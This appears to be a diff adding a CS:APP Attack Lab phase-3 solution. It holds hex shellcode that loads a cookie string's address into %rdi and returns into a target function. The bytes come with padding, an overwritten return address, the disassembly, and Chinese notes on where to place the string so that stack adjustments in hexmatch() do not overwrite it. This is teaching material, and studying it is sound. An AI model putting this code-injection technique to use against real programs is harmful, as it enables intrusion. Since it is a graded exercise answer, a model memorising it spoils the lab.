@@ -1,0 +1,25 @@
+48 c7 c7 a8 dc 61 55 /* movq $0x5561dca8,%rdi */
+68 fa 18 40 00 /* pushq 0x4018fa */
+c3 /* ret */
+00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+78 dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61 00 /* pos of string: 0x5561dca8 */
+/*
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   68 fa 18 40 00          push   $0x4018fa
+
+cookie:59b997fa
+35 39 62 39 39 37 66 61
+
+hexmatch()中移动了很多%rsp(add $0xffffffffffffff80,%rsp)
+所以string最好存在较高地址处才不会被覆盖
+*/
